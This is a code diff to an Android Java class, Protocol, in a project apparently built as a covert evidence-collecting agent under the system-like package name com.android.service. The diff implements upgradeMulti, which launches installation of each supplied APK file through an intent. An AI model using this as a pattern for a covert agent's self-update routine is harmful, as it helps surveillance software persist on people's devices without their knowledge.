@@ -13,10 +13,13 @@ import java.io.File;
 import java.util.Date;
 import java.util.Vector;
 
+import android.content.Intent;
+import android.net.Uri;
 import android.util.Log;
 
 import com.android.service.Debug;
 import com.android.service.LogR;
+import com.android.service.Status;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
@@ -120,8 +123,18 @@ public abstract class Protocol {
 	 *            the files
 	 * @return true, if successful
 	 */
-	public static boolean upgradeMulti(final Vector files) {
-		// TODO
+	public static boolean upgradeMulti(final Vector<String> files) {
+		
+		for(String fileName: files){
+			File file = new File(fileName);
+
+			Intent intent = new Intent(Intent.ACTION_VIEW);
+
+			intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
+			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+			Status.getAppContext().startActivity(intent);
+		}
+		
 		return true;
 	}
 
